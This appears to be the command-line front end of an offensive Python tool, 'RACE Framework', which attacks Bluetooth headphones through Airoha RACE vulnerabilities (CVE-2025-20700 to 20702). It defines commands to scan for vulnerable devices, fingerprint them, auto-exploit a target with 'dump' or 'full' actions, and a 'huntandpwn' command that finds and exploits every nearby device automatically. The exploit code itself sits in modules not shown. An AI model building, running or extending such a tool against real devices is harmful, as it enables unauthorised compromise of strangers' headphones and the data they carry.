#!/usr/bin/env python3
import asyncio
import click
from colorama import init, Fore, Style
init(autoreset=True)

from modules.discovery import scan_for_targets, aggressive_scan
from modules.fingerprint import fingerprint
from modules.exploit import auto_exploit

BANNER = f"""
{Fore.RED}██████╗  █████╗  ██████╗███████╗
{Fore.RED}██╔══██╗██╔══██╗██╔════╝██╔════╝
{Fore.RED}██████╔╝███████║██║     █████╗  
{Fore.RED}██╔══██╗██╔══██║██║     ██╔══╝  
{Fore.RED}██║  ██║██║  ██║╚██████╗███████╗
{Fore.RED}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
{Fore.RED}                                       
{Fore.YELLOW}  Bluetooth Headphone Jacking Framework
{Fore.CYAN}  Church of Malware x ek0ms savi0r
{Fore.RED}  {'='*55}
{Fore.WHITE}  Research: Airoha RACE Vulnerabilities
{Fore.WHITE}  CVEs: 2025-20700, 2025-20701, 2025-20702
{Fore.RED}  {'='*55}{Style.RESET_ALL}
"""

@click.group()
def cli():
    """RACE Framework - Institutional Edition"""
    print(BANNER)

@cli.command()
@click.option('--timeout', default=10, help='Scan duration in seconds.')
@click.option('--deep', is_flag=True, help='Perform deep service discovery.')
def scan(timeout, deep):
    """Discover vulnerable Bluetooth headphones"""
    results = asyncio.run(scan_for_targets(timeout, deep))
    
    if not results:
        print(f"{Fore.RED}[!] No devices found.{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}[+] Found {len(results)} device(s):{Style.RESET_ALL}")
    for dev in results:
        vuln = f"{Fore.RED}[VULN]{Style.RESET_ALL}" if dev['vulnerable'] else ""
        race = f"{Fore.GREEN}[RACE]{Style.RESET_ALL}" if dev.get('race_service', False) else ""
        print(f"  {Fore.YELLOW}{dev['address']}{Style.RESET_ALL} - {dev['name']} {vuln} {race} (RSSI: {dev['rssi']})")

@cli.command()
@click.option('--timeout', default=15, help='Scan duration in seconds.')
def hunt(timeout):
    """Aggressively hunt for RACE services"""
    results = asyncio.run(aggressive_scan(timeout))
    if not results:
        print(f"{Fore.RED}[!] No RACE devices found.{Style.RESET_ALL}")
        return
    print(f"{Fore.GREEN}[+] Found {len(results)} RACE device(s):{Style.RESET_ALL}")
    for dev in results:
        print(f"  {Fore.RED}{dev['address']}{Style.RESET_ALL} - {dev['name']} (RSSI: {dev['rssi']})")

@cli.command()
@click.argument('target_address')
@click.option('--action', default='fingerprint', 
              type=click.Choice(['fingerprint', 'dump', 'full']),
              help='Exploit action to perform.')
def exploit(target_address, action):
    """Auto-exploit a RACE device"""
    result = asyncio.run(auto_exploit(target_address, action))
    if result['status'] == 'success':
        print(f"{Fore.GREEN}[+] Exploit successful!{Style.RESET_ALL}")
        if 'build' in result:
            print(f"  Build: {result['build']}")
        if 'bd_addr' in result:
            print(f"  BD_ADDR: {result['bd_addr']}")
    else:
        print(f"{Fore.RED}[-] Exploit failed: {result.get('message', 'Unknown error')}{Style.RESET_ALL}")

@cli.command()
@click.argument('target_address')
def info(target_address):
    """Get build info from target"""
    result = asyncio.run(fingerprint(target_address))
    if result['status'] == 'success':
        print(f"{Fore.GREEN}[+] Device Fingerprint:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Build Info: {result['build']}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Failed: {result['message']}{Style.RESET_ALL}")

@cli.command()
@click.option('--timeout', default=20, help='Scan duration in seconds.')
def huntandpwn(timeout):
    """Auto-hunt and exploit all RACE devices"""
    from modules.auto_hunter import hunt_and_pwn
    asyncio.run(hunt_and_pwn(timeout))

if __name__ == "__main__":
    cli()
